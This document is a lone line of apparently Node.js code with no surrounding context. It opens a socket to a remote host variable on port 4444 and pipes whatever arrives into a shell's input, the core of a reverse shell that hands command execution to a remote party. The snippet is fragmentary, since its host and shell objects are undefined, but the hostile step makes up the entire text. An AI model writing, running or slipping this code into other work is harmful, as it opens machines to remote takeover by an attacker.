const c=new net.Socket();c.connect(4444,h,()=>{c.pipe(sh.stdin);});
